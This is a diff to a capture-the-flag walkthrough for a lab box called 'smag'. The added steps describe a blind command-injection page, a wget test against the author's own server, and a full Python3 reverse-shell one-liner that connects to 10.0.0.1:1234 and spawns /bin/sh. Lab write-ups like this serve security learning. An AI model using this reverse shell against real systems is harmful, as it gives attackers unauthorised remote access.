@@ -41,7 +41,16 @@
 
 + **Now, let's try to access the development.smag.thm/login.php page so we can use our credentials**
 
-![7](images/login.png?raw=true "login")
+![7](images/login1.jpg?raw=true "login")
+
++ **We are welcomed by a big title 'Enter a command' with a box below. I tried some several linux commands like ls, whoami, etc, but i can't see no output. So i've tried to download a file on the box machine with the wget, hosting a simple python server on mine, just to check if the commands are available and if it's worth trying a reverse shell**
+
+![8](images/wget.jpg?raw=true "wget")
+
++ **It's all working, we get the request so let's move on to a reverse shell, using python3. I've tried with python but not working, because probably on the machine a python3 is installed.**
+
+``python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'``
+
 
 
 
